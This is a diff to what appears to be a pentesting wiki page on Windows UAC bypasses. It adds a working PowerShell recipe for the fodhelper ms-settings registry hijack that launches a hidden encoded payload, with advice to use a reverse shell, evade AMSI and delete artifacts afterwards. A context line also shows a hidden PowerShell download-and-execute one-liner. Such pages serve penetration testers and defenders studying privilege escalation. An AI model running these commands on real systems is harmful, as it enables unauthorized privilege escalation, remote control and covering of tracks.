@@ -152,6 +152,22 @@ runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.w
 
 **Empire** and **Metasploit** also have several modules to **bypass** the **UAC**.
 
+### Fodhelper UAC bypass (HKCU ms-settings DelegateExecute hijack)
+
+Abuses an autoElevated COM handler queried by `fodhelper.exe` when the current user is a local administrator (not at max UAC level). Plant a per-user handler under HKCU and launch fodhelper to execute without a prompt:
+
+```powershell
+New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
+New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null
+Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -w hidden -nop -e <base64-payload>" -Force
+Start-Process -FilePath "C:\Windows\System32\fodhelper.exe"
+```
+
+Notes:
+- No file write is required; everything occurs under HKCU.
+- Replace `<base64-payload>` with your encoded command (e.g., reverse PowerShell). Avoid prompting contexts and AMSI if necessary.
+- Clean up afterwards by removing the `ms-settings` key to reduce artifacts.
+
 ### KRBUACBypass
 
 Documentation and tool in [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)
@@ -207,6 +223,9 @@ If you take a look to **UACME** you will note that **most UAC bypasses abuse a D
 ### Another UAC bypass technique
 
 Consists on watching if an **autoElevated binary** tries to **read** from the **registry** the **name/path** of a **binary** or **command** to be **executed** (this is more interesting if the binary searches this information inside the **HKCU**).
+
+## References
+- [HTB: Rainbow – 0xdf (fodhelper HKCU hijack in practice)](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
 
 {{#include ../../banners/hacktricks-training.md}}
 
